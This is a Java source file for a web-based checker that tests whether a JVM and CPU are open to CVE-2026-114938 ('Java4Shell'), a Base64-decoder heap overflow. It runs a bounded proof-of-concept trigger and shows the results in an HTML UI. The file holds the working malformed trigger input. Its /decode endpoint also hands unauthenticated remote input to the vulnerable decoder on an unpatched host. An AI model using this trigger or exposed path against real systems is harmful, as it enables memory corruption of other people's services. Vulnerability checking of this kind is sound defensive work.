import com.sun.net.httpserver.HttpServer;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.TreeMap;
import java.util.concurrent.Executors;

/**
 * j4s-checker — CVE-2026-114938 (Java4Shell) bounded probe.
 *
 * Runs Calif's bounded proof-of-concept (62-byte OOB write into a 4096-byte
 * array — every write stays inside a real array, safe to run) and reports
 * whether the heap corruption was reproduced on THIS JVM + CPU.
 *
 * Endpoints:
 *   GET /            -> Clarity-styled UI
 *   GET /probe       -> JSON result of the bounded trigger
 *   GET /probe?run=0 -> JSON with machine/JDK/flags info but no trigger run
 *   GET /decode?b64= -> decodes user-supplied base64 (attacker-data path)
 *   GET /health      -> {"status":"UP"}
 */
public final class J4sChecker {

    private static final int WARMUP = 200_000;
    private static final byte[] TARGET = new byte[4096];

    public static void main(String[] args) throws Exception {
        int port = Integer.parseInt(System.getenv().getOrDefault("PORT", "8080"));
        HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);
        server.setExecutor(Executors.newFixedThreadPool(4));
        server.createContext("/", J4sChecker::handle);
        server.start();
        System.out.println("j4s-checker listening on port " + port);
        System.out.println("  runtime=" + System.getProperty("java.runtime.version"));
    }

    private static void handle(com.sun.net.httpserver.HttpExchange ex) throws java.io.IOException {
        String path = ex.getRequestURI().getPath();
        String query = ex.getRequestURI().getQuery() == null ? "" : ex.getRequestURI().getQuery();
        try {
            switch (path) {
                case "/health":
                    json(ex, 200, "{\"status\":\"UP\"}");
                    break;
                case "/probe":
                    // /probe runs the trigger; /probe?run=0 returns info only
                    json(ex, 200, probe(!"run=0".equals(query)));
                    break;
                case "/decode":
                    json(ex, 200, decode(query));
                    break;
                default:
                    html(ex);
            }
        } catch (Exception e) {
            json(ex, 500, "{\"error\":\"" + esc(String.valueOf(e)) + "\"}");
        }
    }

    // ------------------------------------------------------------------
    // Probe: Calif's bounded trigger
    // ------------------------------------------------------------------

    private static String probe(boolean runTrigger) {
        Map<String, Object> m = new LinkedHashMap<>();
        m.put("cve", "CVE-2026-114938");
        m.put("name", "Java4Shell");
        m.put("runtime", System.getProperty("java.runtime.version"));
        m.put("vm", System.getProperty("java.vm.name"));
        m.put("vendor", System.getProperty("java.vendor"));
        m.put("os", System.getProperty("os.name") + " " + System.getProperty("os.version"));
        m.put("jdkFeatureVersion", jdkFeature());
        m.put("cpuFlags", cpuFlags());

        int feature = jdkFeature();
        // Trigger: 21/25/27 -> 64 x 'A' + '='; 17 -> 128 x 'A' + '='
        int n = feature >= 21 ? 64 : 128;
        String trigger = "A".repeat(n) + "=";
        m.put("trigger", trigger);
        m.put("triggerLength", trigger.length());

        if (!runTrigger) {
            m.put("executed", false);
            return toJson(m);
        }

        Base64.Decoder decoder = Base64.getDecoder();
        byte[] valid = "A".repeat(n).getBytes(StandardCharsets.US_ASCII);
        byte[] malformed = trigger.getBytes(StandardCharsets.US_ASCII);
        int sink = 0;
        for (int i = 0; i < WARMUP; i++) {
            sink += decoder.decode(valid, TARGET);
        }
        java.util.Arrays.fill(TARGET, (byte) 0x5a);
        boolean rejected = false;
        String exception = null;
        try {
            decoder.decode(malformed, TARGET);
        } catch (IllegalArgumentException e) {
            rejected = true;
            exception = e.getClass().getSimpleName() + ": " + e.getMessage();
        }
        int changed = 0, first = -1, last = -1;
        for (int i = 50; i < TARGET.length; i++) {
            if (TARGET[i] != (byte) 0x5a) {
                changed++;
                if (first < 0) first = i;
                last = i;
            }
        }
        m.put("executed", true);
        m.put("warmupIterations", WARMUP);
        m.put("warmupDecodeTotal", sink);
        m.put("rejected", rejected);
        m.put("exception", exception);
        m.put("bytesChanged", changed);
        m.put("firstChangedOffset", first);
        m.put("lastChangedOffset", last);
        m.put("expected", "rejected=true, bytesChanged=62, first=50, last=111");
        boolean reproduced = rejected && changed == 62 && first == 50 && last == 111;
        m.put("result", reproduced ? "REPRODUCED" : "NOT REPRODUCED");
        return toJson(m);
    }

    private static int jdkFeature() {
        try {
            return Runtime.version().feature();
        } catch (Throwable t) {
            return -1;
        }
    }

    private static Map<String, Object> cpuFlags() {
        Map<String, Object> flags = new TreeMap<>();
        String[] wanted = {"avx512f", "avx512bw", "avx512vbmi", "avx512vl", "bmi2", "avx2"};
        String model = "?";
        try (InputStream in = new java.io.FileInputStream("/proc/cpuinfo")) {
            byte[] buf = new byte[65536];
            int r = in.read(buf);
            String txt = new String(buf, 0, r, StandardCharsets.US_ASCII);
            for (String line : txt.split("\n")) {
                if (line.startsWith("flags")) {
                    String[] parts = line.split("\\s+");
                    for (String w : wanted) flags.put(w, false);
                    for (String p : parts) for (String w : wanted) if (p.equals(w)) flags.put(w, true);
                } else if (line.startsWith("model name") && model.equals("?")) {
                    model = line.substring(line.indexOf(':') + 1).trim();
                }
            }
        } catch (Exception ignored) {
            for (String w : wanted) flags.put(w, false);
        }
        flags.put("cpuModel", model);
        flags.put("allFour", Boolean.TRUE.equals(flags.get("avx512f"))
                && Boolean.TRUE.equals(flags.get("avx512bw"))
                && Boolean.TRUE.equals(flags.get("avx512vbmi"))
                && Boolean.TRUE.equals(flags.get("bmi2")));
        return flags;
    }

    private static String decode(String query) {
        Map<String, Object> m = new LinkedHashMap<>();
        String b64 = "";
        for (String kv : query.split("&")) {
            int i = kv.indexOf('=');
            if (i > 0 && "b64".equals(kv.substring(0, i))) {
                b64 = URLDecoder.decode(kv.substring(i + 1), StandardCharsets.UTF_8);
            }
        }
        m.put("input", b64);
        m.put("inputLength", b64.length());
        try {
            byte[] out = Base64.getDecoder().decode(b64);
            m.put("ok", true);
            m.put("decodedLength", out.length);
            m.put("firstBytes", bytesToHex(java.util.Arrays.copyOf(out, Math.min(out.length, 16))));
        } catch (Exception e) {
            m.put("ok", false);
            m.put("error", e.getMessage());
        }
        return toJson(m);
    }

    // ------------------------------------------------------------------
    // Output helpers
    // ------------------------------------------------------------------

    private static String bytesToHex(byte[] b) {
        StringBuilder sb = new StringBuilder();
        for (byte x : b) sb.append(String.format("%02x ", x));
        return sb.toString().trim();
    }

    @SuppressWarnings("unchecked")
    private static String toJson(Object o) {
        StringBuilder sb = new StringBuilder();
        writeJson(o, sb);
        return sb.toString();
    }

    @SuppressWarnings("unchecked")
    private static void writeJson(Object o, StringBuilder sb) {
        if (o instanceof Map) {
            sb.append('{');
            boolean first = true;
            for (Map.Entry<?, ?> e : ((Map<?, ?>) o).entrySet()) {
                if (!first) sb.append(',');
                first = false;
                sb.append('"').append(esc(String.valueOf(e.getKey()))).append("\":");
                writeJson(e.getValue(), sb);
            }
            sb.append('}');
        } else if (o instanceof String) {
            sb.append('"').append(esc((String) o)).append('"');
        } else if (o instanceof Boolean || o instanceof Number) {
            sb.append(o);
        } else if (o == null) {
            sb.append("null");
        } else {
            sb.append('"').append(esc(String.valueOf(o))).append('"');
        }
    }

    private static String esc(String s) {
        if (s == null) return "";
        StringBuilder sb = new StringBuilder();
        for (char c : s.toCharArray()) {
            switch (c) {
                case '"': sb.append("\\\""); break;
                case '\\': sb.append("\\\\"); break;
                case '\n': sb.append("\\n"); break;
                case '\r': sb.append("\\r"); break;
                case '\t': sb.append("\\t"); break;
                default:
                    if (c < 0x20) sb.append(String.format("\\u%04x", (int) c));
                    else sb.append(c);
            }
        }
        return sb.toString();
    }

    private static void json(com.sun.net.httpserver.HttpExchange ex, int code, String body) throws java.io.IOException {
        byte[] b = body.getBytes(StandardCharsets.UTF_8);
        ex.getResponseHeaders().set("Content-Type", "application/json; charset=utf-8");
        ex.sendResponseHeaders(code, b.length);
        try (OutputStream os = ex.getResponseBody()) { os.write(b); }
    }

    private static void html(com.sun.net.httpserver.HttpExchange ex) throws java.io.IOException {
        byte[] b = (INDEX_HTML).getBytes(StandardCharsets.UTF_8);
        ex.getResponseHeaders().set("Content-Type", "text/html; charset=utf-8");
        ex.sendResponseHeaders(200, b.length);
        try (OutputStream os = ex.getResponseBody()) { os.write(b); }
    }

    // ------------------------------------------------------------------
    // UI — VMware Clarity (CDS) design language, self-contained
    // Palette derived from vmware-clarity/core tokens.ts (HSL scale model)
    // ------------------------------------------------------------------

    private static final String INDEX_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Java4Shell Checker — CVE-2026-114938</title>
<style>
  /* Clarity tokens (from vmware-clarity/core design tokens) */
  :root {
    --primary-400:  hsl(198, 100%, 59%);   /* blue 400 */
    --primary-500:  hsl(198, 100%, 48%);   /* blue 500 */
    --primary-600:  hsl(198, 100%, 43%);
    --primary-700:  hsl(198, 100%, 34%);   /* text/link 700 */
    --primary-900:  hsl(198, 100%, 21%);
    --info-500:     hsl(211, 100%, 54%);
    --success-800:  hsl(160, 100%, 21%);   /* jade 800 */
    --success-100:  hsl(160, 78%, 88%);
    --success-50:   hsl(160, 83%, 95%);
    --danger-800:   hsl(9, 100%, 38%);     /* red 800 */
    --danger-500:   hsl(9, 100%, 65%);
    --danger-100:   hsl(9, 100%, 94%);
    --danger-50:    hsl(9, 100%, 97%);
    --warn-600:     hsl(39, 100%, 50%);    /* ochre 600 */
    --warn-50:      hsl(41, 100%, 96%);
    --text-100:     hsl(0, 0%, 100%);
    --text-500:     hsl(0, 0%, 0%);
    --text-400:     hsl(198, 10%, 46%);    /* construction 400: headings */
    --text-300:     hsl(198, 10%, 56%);    /* construction 300: labels */
    --text-200:     hsl(198, 20%, 91%);    /* construction 200: placeholders */
    --border-100:   hsl(198, 14%, 82%);    /* construction 200 */
    --border-50:    hsl(198, 20%, 91%);    /* construction 100 */
    --bg-50:        hsl(198, 20%, 96%);    /* construction 50 */
    --white:        #fff;
    --shadow-100:   0 0.05rem 0.15rem 0 hsla(198, 30%, 15%, 0.5);  /* CDS hard bottom shadow */
    --shadow-200:   0 0.05rem 0.15rem 0 hsla(198, 30%, 15%, 0.3);
    --radius-100:   0.25rem;
    --radius-200:   0.75rem;
    --font: "Clarity City","Segoe UI",-apple-system,BlinkMacSystemFont,Roboto,"Helvetica Neue",sans-serif;
    --base: 20px;
  }
  * { box-sizing: border-box; }
  html { font-size: var(--base); }
  body { margin: 0; font-family: var(--font); font-size: 0.9rem; font-weight: 400;
         color: var(--text-500); background: var(--bg-50); }

  /* Top bar — CDS header */
  .topbar { background: var(--white); border-bottom: 0.05rem solid var(--border-50);
            padding: 0.8rem 1.5rem; display: flex; align-items: center; gap: 0.75rem; }
  .topbar .logo { width: 1.6rem; height: 1.6rem; background: var(--primary-500);
                  border-radius: var(--radius-100); display: grid; place-items: center;
                  color: var(--white); font-weight: 600; font-size: 0.85rem; }
  .topbar h1 { font-size: 1rem; font-weight: 600; margin: 0; color: var(--text-400); }
  .topbar .sub { font-size: 0.75rem; color: var(--text-300); margin-top: 0.1rem; }
  .topbar .badge { margin-left: auto; }

  main { max-width: 62rem; margin: 1.5rem auto; padding: 0 1.5rem; }

  /* Cards */
  .card { background: var(--white); border: 0.05rem solid var(--border-100);
          border-radius: var(--radius-100); box-shadow: var(--shadow-200);
          padding: 1.25rem 1.5rem; margin-bottom: 1.5rem; }
  .card h2 { font-size: 0.85rem; font-weight: 600; color: var(--text-400);
             margin: 0 0 0.9rem 0; text-transform: none; }
  .card h2 .hint { font-weight: 400; color: var(--text-300); font-size: 0.72rem; }

  /* Badges */
  .badge { display: inline-flex; align-items: center; gap: 0.4rem; border-radius: 1rem;
           padding: 0.15rem 0.7rem; font-size: 0.72rem; font-weight: 600; }
  .badge::before { content: ""; width: 0.45rem; height: 0.45rem; border-radius: 50%; }
  .badge.neutral { background: var(--bg-50); color: var(--text-400); }
  .badge.neutral::before { background: var(--text-300); }
  .badge.ok      { background: var(--success-50); color: var(--success-800); }
  .badge.ok::before      { background: var(--success-800); }
  .badge.bad     { background: var(--danger-50); color: var(--danger-800); }
  .badge.bad::before     { background: var(--danger-800); }
  .badge.warn    { background: var(--warn-50); color: var(--warn-600); }
  .badge.warn::before    { background: var(--warn-600); }

  /* Verdict panel */
  .verdict { text-align: center; padding: 1.8rem 1.5rem; }
  .verdict .state { font-size: 1.9rem; font-weight: 600; letter-spacing: 0.02em; }
  .verdict .state.repro { color: var(--danger-800); }
  .verdict .state.clean { color: var(--success-800); }
  .verdict .state.idle  { color: var(--text-300); }
  .verdict .detail { margin-top: 0.5rem; font-size: 0.8rem; color: var(--text-300); }
  .verdict .detail code { background: var(--bg-50); padding: 0.05rem 0.35rem; border-radius: 0.2rem; }

  /* Buttons — CDS */
  .btn { font-family: var(--font); font-size: 0.85rem; font-weight: 500;
         border-radius: var(--radius-100); padding: 0.45rem 1.1rem; cursor: pointer;
         border: 0.05rem solid transparent; transition: background 0.15s; }
  .btn-primary { background: var(--primary-500); color: var(--white); }
  .btn-primary:hover { background: var(--primary-600); }
  .btn-outline { background: var(--white); color: var(--primary-700);
                 border-color: var(--primary-500); }
  .btn-outline:hover { background: var(--bg-50); }
  .btn:disabled { opacity: 0.5; cursor: wait; }

  /* Table / key-value */
  table.kv { width: 100%; border-collapse: collapse; font-size: 0.8rem; }
  table.kv td { padding: 0.45rem 0.6rem; border-bottom: 0.05rem solid var(--border-50);
                vertical-align: top; }
  table.kv tr:last-child td { border-bottom: none; }
  table.kv td.k { width: 16rem; color: var(--text-300); font-weight: 500; }
  table.kv td.v { color: var(--text-500); word-break: break-all; }
  table.kv td.v .flag { display: inline-block; margin: 0 0.3rem 0.2rem 0; padding: 0.1rem 0.5rem;
                        border-radius: 0.2rem; font-size: 0.72rem; font-weight: 600;
                        background: var(--bg-50); color: var(--text-300); }
  table.kv td.v .flag.on  { background: var(--success-50); color: var(--success-800); }
  table.kv td.v .flag.off { background: var(--bg-50); color: var(--text-200); text-decoration: line-through; }
  table.kv td.v .flag.req { outline: 0.08rem solid var(--primary-500); }
  table.kv td.v .flag.req.on  { background: var(--success-50); }
  table.kv td.v .flag.req.off { background: var(--danger-50); color: var(--danger-800); }

  .two { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
  @media (max-width: 60rem) { .two { grid-template-columns: 1fr; } }

  /* decode form */
  .decode-row { display: flex; gap: 0.6rem; margin-bottom: 0.6rem; }
  .decode-row input { flex: 1; font-family: var(--font); font-size: 0.8rem;
                      padding: 0.45rem 0.6rem; border: 0.05rem solid var(--border-100);
                      border-radius: var(--radius-100); color: var(--text-500); }
  .decode-row input:focus { outline: 0.1rem solid var(--primary-500); outline-offset: 0.05rem; border-color: var(--primary-500); }
  .mono { font-family: ui-monospace, "SFMono-Regular", Consolas, monospace; font-size: 0.75rem; }
  pre.out { background: var(--bg-50); border: 0.05rem solid var(--border-50);
            border-radius: var(--radius-100); padding: 0.8rem 1rem; overflow-x: auto;
            font-family: ui-monospace, "SFMono-Regular", Consolas, monospace;
            font-size: 0.72rem; white-space: pre-wrap; word-break: break-all; }
  footer { text-align: center; font-size: 0.7rem; color: var(--text-300); padding: 1.5rem 0 2rem; }
  footer a { color: var(--primary-700); text-decoration: none; }
  .loading { color: var(--text-300); font-size: 0.8rem; text-align: center; padding: 1rem; }
</style>
</head>
<body>
  <div class="topbar">
    <div class="logo">J4</div>
    <div>
      <h1>Java4Shell Checker</h1>
      <div class="sub">CVE-2026-114938 · bounded Base64-decoder heap-overflow probe</div>
    </div>
    <span class="badge neutral" id="cve-badge">CVE-2026-114938</span>
  </div>

  <main>
    <div class="card verdict" id="verdict-card">
      <div class="state idle" id="verdict-state">NOT RUN</div>
      <div class="detail" id="verdict-detail">Run the probe to test this JVM + CPU against the bounded trigger.</div>
      <div style="margin-top:1.2rem">
        <button class="btn btn-primary" id="run-btn" onclick="runProbe()">Run bounded trigger</button>
        <button class="btn btn-outline" onclick="fetch('/probe?run=0').then(r=>r.json()).then(renderInfo)">Refresh machine info</button>
      </div>
    </div>

    <div class="two">
      <div class="card">
        <h2>Runtime <span class="hint">— JDK condition (fixed: 17.0.21.1 / 21.0.13.1 / 25.0.5.1 / 27.0.1.1)</span></h2>
        <table class="kv" id="runtime-kv"><tr><td class="v" colspan="2"><div class="loading">loading…</div></td></tr></table>
      </div>
      <div class="card">
        <h2>Hardware <span class="hint">— all four flags must be present for the vulnerable code path</span></h2>
        <table class="kv" id="hw-kv"><tr><td class="v" colspan="2"><div class="loading">loading…</div></td></tr></table>
      </div>
    </div>

    <div class="card">
      <h2>Last probe result <span class="hint">— expected on vulnerable: rejected=true bytesChanged=62 first=50 last=111</span></h2>
      <pre class="out" id="result-out">no probe run yet — click "Run bounded trigger"</pre>
    </div>

    <div class="card">
      <h2>Interactive Base64 decode <span class="hint">— the attacker-data path (login headers, tokens, uploads); try the 64×A + "=" trigger</span></h2>
      <div class="decode-row">
        <input id="b64-input" value="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
               placeholder="base64 to decode">
        <button class="btn btn-outline" onclick="doDecode()">Decode</button>
      </div>
      <pre class="out" id="decode-out">decode result will appear here</pre>
    </div>

    <div class="card">
      <h2>About this probe</h2>
      <table class="kv">
        <tr><td class="k">Vulnerability</td><td class="v">Memory corruption in OpenJDK's AVX-512 VBMI Base64-decoding intrinsic (C2-compiled). A malformed 65-byte input causes a 62-byte out-of-bounds write past a 50-byte buffer before validation rejects it.</td></tr>
        <tr><td class="k">Why it's safe to run</td><td class="v">This is Calif's <em>bounded</em> proof-of-concept: the trigger decodes into a 4096-byte array, so every overwritten byte lands inside a real array. It proves the corruption; it is not the weaponized RCE chain (which is held back by the researchers).</td></tr>
        <tr><td class="k">Interpretation</td><td class="v"><strong>REPRODUCED</strong> = this JVM + CPU exhibit the corruption (runtime vulnerable + hardware condition met). <strong>NOT REPRODUCED</strong> = the vulnerable path was not taken (no AVX-512 VBMI, fixed JDK, or intrinsics disabled). A negative is not a safety verdict — JIT/JVM-option differences can suppress it.</td></tr>
        <tr><td class="k">Mitigations</td><td class="v">Patch to fixed builds, or launch with <code>-XX:-UseBASE64Intrinsics</code> (or <code>-XX:UseAVX=2</code> on x86-64 only).</td></tr>
        <tr><td class="k">Sources</td><td class="v">calif.io/java4shell · oracle.com CSPU Nov 2026 · ikow/java4shell-poc</td></tr>
      </table>
    </div>
  </main>

  <footer>j4s-checker · bounded PoC after Calif (Java4Shell) · kirkware lab · 2026-11-18</footer>

<script>
function flagCell(flag, required) {
  return '<td class="v"><span class="flag ' + (flag ? 'on' : 'off') + (required ? ' req' : '') + '">' +
         flag + (required ? ' (required)' : '') + '</span></td>';
}
function row(k, v) { return '<tr><td class="k">' + k + '</td><td class="v">' + v + '</td></tr>'; }

function renderInfo(d) {
  const rt = document.getElementById('runtime-kv');
  rt.innerHTML =
    row('JDK', '<span class="mono">' + d.runtime + '</span>') +
    row('VM', d.vm) +
    row('Vendor', d.vendor) +
    row('OS', d.os) +
    row('Trigger input', '<span class="mono">' + d.trigger + '</span> (' + d.triggerLength + ' bytes — ' +
        (d.triggerLength === 65 ? 'JDK 21/25/27 form' : 'JDK 17 form') + ')') +
    row('Executed', String(!!d.executed));
  const hw = document.getElementById('hw-kv');
  const f = d.cpuFlags || {};
  hw.innerHTML =
    row('CPU model', '<span class="mono">' + (f.cpuModel || '?') + '</span>') +
    '<tr><td class="k">Required flags</td>' +
    '<td class="v">' +
      '<span class="flag ' + (f.avx512f ? 'on' : 'off') + ' req">' + (f.avx512f ? 'avx512f' : 'avx512f (required)') + '</span>' +
      '<span class="flag ' + (f.avx512bw ? 'on' : 'off') + ' req">' + (f.avx512bw ? 'avx512bw' : 'avx512bw (required)') + '</span>' +
      '<span class="flag ' + (f.avx512vbmi ? 'on' : 'off') + ' req">' + (f.avx512vbmi ? 'avx512vbmi' : 'avx512vbmi (required)') + '</span>' +
      '<span class="flag ' + (f.bmi2 ? 'on' : 'off') + ' req">' + (f.bmi2 ? 'bmi2' : 'bmi2 (required)') + '</span>' +
    '</td></tr>' +
    row('Other (info)', (f.avx2 ? '<span class="flag on">avx2</span> ' : '<span class="flag off">avx2</span> ') +
                        (f.avx512vl ? '<span class="flag on">avx512vl</span> ' : '<span class="flag off">avx512vl</span>')) +
    row('All four present', f.allFour
        ? '<span class="badge ok">hardware condition MET</span>'
        : '<span class="badge neutral">hardware condition NOT met</span>');
}

function runProbe() {
  const btn = document.getElementById('run-btn');
  btn.disabled = true; btn.textContent = 'Running… (warmup ~200k decodes)';
  document.getElementById('verdict-state').textContent = 'RUNNING';
  document.getElementById('verdict-state').className = 'state idle';
  fetch('/probe')
    .then(r => r.json())
    .then(d => {
      renderInfo(d);
      document.getElementById('result-out').textContent = JSON.stringify(d, null, 2);
      const vs = document.getElementById('verdict-state');
      const vd = document.getElementById('verdict-detail');
      if (d.result === 'REPRODUCED') {
        vs.textContent = 'REPRODUCED — VULNERABLE';
        vs.className = 'state repro';
        vd.innerHTML = '62 bytes written past the 50-byte buffer <code>(offsets 50–111)</code>. ' +
          'This JVM + CPU exhibits the Java4Shell corruption.';
      } else {
        vs.textContent = 'NOT REPRODUCED';
        vs.className = 'state clean';
        vd.innerHTML = 'Vulnerable path not taken here (missing AVX-512 VBMI, patched JDK, or intrinsics disabled). ' +
          'bytesChanged=' + d.bytesChanged + ', rejected=' + d.rejected + '.';
      }
      btn.disabled = false; btn.textContent = 'Run bounded trigger';
    })
    .catch(e => {
      btn.disabled = false; btn.textContent = 'Run bounded trigger';
      document.getElementById('verdict-state').textContent = 'ERROR';
      document.getElementById('verdict-detail').textContent = String(e);
    });
}

function doDecode() {
  const v = document.getElementById('b64-input').value;
  fetch('/decode?b64=' + encodeURIComponent(v)).then(r => r.json()).then(d => {
    document.getElementById('decode-out').textContent = JSON.stringify(d, null, 2);
  });
}

fetch('/probe?run=0').then(r => r.json()).then(renderInfo).catch(() => {});
</script>
</body>
</html>
""";
}
